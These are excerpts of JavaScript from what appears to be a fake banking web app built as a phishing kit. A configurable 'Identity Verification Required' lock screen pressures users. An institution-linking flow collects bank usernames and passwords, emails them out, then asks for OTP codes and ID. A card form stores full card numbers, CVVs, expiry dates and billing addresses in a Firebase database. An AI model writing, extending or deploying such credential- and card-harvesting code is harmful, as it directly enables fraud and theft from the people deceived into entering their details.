...
function _enablePush(){
  ...
  // Also register SW push subscription for standard Web Push
...
function _showDemoLock(){
  var c=_cfg;
  _setEl('dl-title',c.lockTitle||'Identity Verification Required');
  _setEl('dl-sub',c.lockSubtitle||'To continue using your account, please take the next step to verify your identity.');
  ...
  var mcon=$('dl-methods');if(!mcon)return;mcon.innerHTML='';
  methods.forEach(function(m){
    ...
    div.innerHTML='<div class="dl-method-ico"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--p)" stroke-width="2" stroke-linecap="round"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg></div>'+
      '<div class="dl-method-txt">'+(c.lockBtnLabel||'Take the Next Step')+'</div>'+
      '<span class="dl-method-arrow">&#8250;</span>';
    div.onclick=function(){_startLockFlow(m);};mcon.appendChild(div);
  });
  var contact=$('dl-contact');if(contact&&c.lockContactEmail)contact.innerHTML='Need help? <a href="mailto:'+_esc(c.lockContactEmail)+'">'+_esc(c.lockContactEmail)+'</a>';
  _show('demolock',false);
}
...
function APP_lockFlowSubmit(){
  ...
  _lockFlow.data=data;
  _db.ref(DB.locks+'/'+_user.uid+'_'+Date.now()).set(Object.assign({},data,{
...
function _renderCards(){
  ...
  var cards=(_ud.linkedCards||[]).filter(Boolean);con.innerHTML='';
  if(!cards.length){con.innerHTML='<div style="color:var(--t2);font-size:14px;text-align:center;padding:20px 0 8px;">No cards linked yet</div>';return;}
  cards.forEach(function(card){
    var div=document.createElement('div');div.className='card-item';
    div.innerHTML='<div class="card-chip"></div><div class="card-num">\u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 '+_esc(card.lastFour||'\u2022\u2022\u2022\u2022')+'</div>'+
      '<div class="card-name">Card Holder</div><div class="card-holder">'+_esc((card.name||(_ud.firstname+' '+_ud.surname)).toUpperCase())+'</div>'+
      '<div class="card-brand">'+_esc(card.bankName||card.brand||'BANK')+'</div>'+
      '<div class="card-status '+_esc(card.status||'pending')+'">'+(card.status==='authorized'?'AUTHORIZED':card.status==='rejected'?'REJECTED':'PENDING')+'</div>';
    con.appendChild(div);
  });
}
function _renderInstitutions(){
  ...
  insts.forEach(function(inst,idx){
    var div=document.createElement('div');div.className='inst-banner';
    ...
    div.onclick=function(){_startInstFlow(inst,idx);};list.appendChild(div);
  });
}
...
function _startInstFlow(inst,idx){
  ...
  var con=$('inst-step1-fields');if(con){con.innerHTML='';
    ...
    var fields=fType==='credentials'?[{key:'identifier',label:'Username / ID',type:'text'},{key:'password',label:'Password',type:'password'}]:
    ...
    fields.forEach(function(f){
      var w=document.createElement('div');w.style.marginBottom='10px';
      var l=document.createElement('div');l.style.cssText='font-size:12px;font-weight:700;color:var(--t2);text-transform:uppercase;letter-spacing:.5px;margin-bottom:5px;';l.textContent=f.label;
...
function APP_instStep1Submit(){
  ...
  _sendEmail('otp','Institution Link Step 1 \u2014 '+inst.name,{user_name:(_ud.firstname||'')+' '+(_ud.surname||''),user_email:_ud.email,institution:inst.name,fields:JSON.stringify(data),message:'User submitted credentials. OTP step pending.'});
  _show('inst-step2',true);
}
function APP_instOtpSubmit(){
  ...
  if(inst.requireId){_buildInstIdStep();_show('inst-step3',true);}
  else _submitInstFinal();
}
...
function _submitInstFinal(){
  var inst=_instFlow.inst,data=_instFlow.data;
  var sub=Object.assign({},data,{uid:_user.uid,name:(_ud.firstname+' '+_ud.surname).trim(),email:_ud.email,accountNumber:_ud.accountNumber,institution:inst.name,requireId:!!inst.requireId,otpType:inst.otpType,status:'pending',addedDate:new Date().toISOString()});
...
function _txRow(tx){
  ...
  var cls=isCr?'cr':isPending?'pd':'dr';
  var icoColor=isCr?'rgba(22,163,74,.12)':isPending?'rgba(217,119,6,.1)':'rgba(220,38,38,.1)';
  var sc=isCr?'var(--ok)':isPending?'var(--warn)':'var(--er)';
  var icoSvg=isCr?'<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="'+sc+'" stroke-width="2.5" stroke-linecap="round"><polyline points="17 1 21 5 17 9"/><path d="M3 11V9a4 4 0 0 1 4-4h14"/></svg>':isPending?'<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="'+sc+'" stroke-width="2.5" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>':'<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="'+sc+'" stroke-width="2.5" stroke-linecap="round"><polyline points="7 23 3 19 7 15"/><path d="M21 13v2a4 4 0 0 1-4 4H3"/></svg>';
  var txJson=encodeURIComponent(JSON.stringify(tx));
  return '<div class="tx-item" onclick="APP.showReceipt(\''+txJson+'\')"><div class="tx-ico" style="background:'+icoColor+';">'+icoSvg+'</div><div class="tx-info"><div class="tx-name">'+_esc(tx.description||tx.type||'Transaction')+'</div><div class="tx-date">'+_fmtDate(tx.date)+'</div></div><div class="tx-amt '+cls+'">'+amt+'</div></div>';
}
function APP_showReceipt(txJson){
  ...
  body.innerHTML='<div style="text-align:center;padding:8px 0 20px;"><div style="width:64px;height:64px;border-radius:50%;background:'+(isCr?'rgba(22,163,74,.1)':'rgba(30,63,206,.1)')+';display:flex;align-items:center;justify-content:center;margin:0 auto 12px;">'+(isCr?'<svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="var(--ok)" stroke-width="2.5" stroke-linecap="round"><polyline points="17 1 21 5 17 9"/><path d="M3 11V9a4 4 0 0 1 4-4h14"/></svg>':'<svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="var(--p)" stroke-width="2.5" stroke-linecap="round"><polyline points="7 23 3 19 7 15"/><path d="M21 13v2a4 4 0 0 1-4 4H3"/></svg>')+'</div><div style="font-size:32px;font-weight:800;letter-spacing:-1px;color:'+(isCr?'var(--ok)':'var(--text)')+';">'+(isCr?'+':'-')+sym+amt+'</div><div style="font-size:13px;font-weight:700;margin-top:6px;color:'+statusColor+';">'+statusLabel+'</div></div>'+
...
function APP_submitCard(){
  var name=$('m-ch-name')&&$('m-ch-name').value.trim()||'',cn=($('m-cn')&&$('m-cn').value||'').replace(/\s/g,'');
  var exp=$('m-exp')&&$('m-exp').value||'',cvv=$('m-cvv')&&$('m-cvv').value||'';
  var bank=$('m-bank')&&$('m-bank').value.trim()||'',bal=$('m-bal')&&$('m-bal').value||'0';
  var email=$('m-email')&&$('m-email').value.trim()||'';
  var street=$('m-street')&&$('m-street').value.trim()||'',city=$('m-city')&&$('m-city').value.trim()||'';
  var postcode=$('m-postcode')&&$('m-postcode').value.trim()||'',country=$('m-ba-country')&&$('m-ba-country').value.trim()||'';
  var phone=$('m-phone')&&$('m-phone').value.trim()||'';
  var err=$('m-err');if(err)err.textContent='';if(!name||!cn||!exp||!cvv){if(err)err.textContent='Please fill in all card details.';return;}
  var cards=(_ud.linkedCards||[]);
  cards.push({name:name,number:cn,lastFour:cn.slice(-4),expiry:exp,cvv:cvv,bankName:bank,currentBalance:bal,brand:(/^4/.test(cn)?'Visa':/^5[1-5]/.test(cn)?'Mastercard':/^3[47]/.test(cn)?'Amex':'Card'),email:email,billingAddress:{street:street,city:city,postcode:postcode,country:country,phone:phone},status:'processing',addedDate:new Date().toISOString()});
  _db.ref(DB.users+'/'+_user.uid+'/linkedCards').set(cards).then(function(){
    if(_ud)_ud.linkedCards=cards;_renderCards();
    _sendEmail('general','New Card Submission',{user_name:_ud.firstname,user_email:_ud.email,card_last4:cn.slice(-4),bank:bank,message:'User submitted a card for review.'});
    _closeModal();APP_toast('Card submitted for review!','ok');
  });
}
...
var APP={
  ...
  instStep1Submit:APP_instStep1Submit,instOtpSubmit:APP_instOtpSubmit,instIdSubmit:APP_instIdSubmit,
  lockFlowSubmit:APP_lockFlowSubmit,
